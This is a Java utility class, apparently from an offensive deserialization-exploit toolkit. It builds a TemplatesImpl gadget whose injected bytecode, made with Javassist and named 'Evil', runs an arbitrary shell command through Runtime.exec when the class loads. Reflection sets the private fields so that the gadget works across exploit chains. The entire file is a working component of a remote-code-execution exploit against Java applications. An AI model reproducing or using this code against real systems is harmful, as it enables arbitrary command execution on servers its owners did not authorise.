package com.Jasetol.utils;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

public class CreateTemplatesImpl {
    public static TemplatesImpl createTemplatesImpl() throws Exception{
        byte[] bytes = getEvilBytes();
        TemplatesImpl templates = new TemplatesImpl();
        Reflect.reflectSetField(templates,"_name","ky0117");
        Reflect.reflectSetField(templates,"_bytecodes",new byte[][]{bytes});
        // 兼容性问题,不加这个有些链会报错!
        Reflect.reflectSetField(templates,"_tfactory",new TransformerFactoryImpl());
        return templates;
    }

    public static byte[] getEvilBytes() throws Exception{
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(Evil.class));
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        final CtClass clazzEvil = classPool.get(Evil.class.getName());
        clazzEvil.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec(\""+ParseArgs.cmd+"\");");
        CtClass clazzAbstract = classPool.get(AbstractTranslet.class.getName());
        clazzEvil.setSuperclass(clazzAbstract);
        byte[] bytes = clazzEvil.toBytecode();
        return bytes;
    }
}
